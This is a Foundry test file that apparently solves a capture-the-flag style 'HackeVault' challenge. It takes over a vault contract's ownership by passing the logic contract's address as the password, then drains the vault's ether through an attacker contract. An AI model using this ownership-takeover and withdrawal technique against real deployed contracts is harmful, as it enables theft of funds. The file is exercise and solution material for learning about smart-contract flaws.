// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/HackeVault/Vault.sol";
import "../../src/HackeVault/VaultAttact.sol";
contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    VaultAttact public hacker;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        hacker = new VaultAttact(address(vault));
        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        hacker.depositEthtoVault{value: 0.01 ether}();
        console.log(vault.owner());
        // add your hacker code.

        hacker.changeVaultOwner(bytes32(uint256(uint160(address(logic)))));
        console.log(vault.owner());
        console.log("befor hacker balance:", address(hacker).balance);
        hacker.withdrawFromVault();
        console.log("after hacker balance:", address(hacker).balance);

        console.log("vault balance:", address(vault).balance);
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
